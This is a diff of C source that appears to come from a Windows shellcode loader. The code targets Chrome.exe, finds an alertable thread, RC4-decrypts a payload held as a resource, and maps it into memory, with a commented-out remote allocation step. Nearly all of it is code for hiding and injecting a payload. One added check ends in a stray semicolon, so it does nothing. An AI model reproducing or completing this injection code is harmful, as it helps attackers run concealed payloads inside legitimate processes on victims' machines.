@@ -11,6 +11,8 @@ int main()
 	PVOID pExPayload, pMain;
 	LPWSTR TargetProcessName = L"Chrome.exe";
 
+	
+
 	if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
 
 	if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
@@ -45,7 +47,11 @@ int main()
 
 	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
 
-	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, pPayload_t.sText);
+	rFin(&RC4Context_t, (PVOID)resource.pAddress, pPayload_t.pText, pPayload_t.sText);
+
+	if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hThread1));
+
+	printf("0x%p\n", pExtPayloadAddres);
 
 	//if (!(pExPayload = VirtualAllocEx(hProcess1, 0, pPayload_t.sText,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return -7;
 
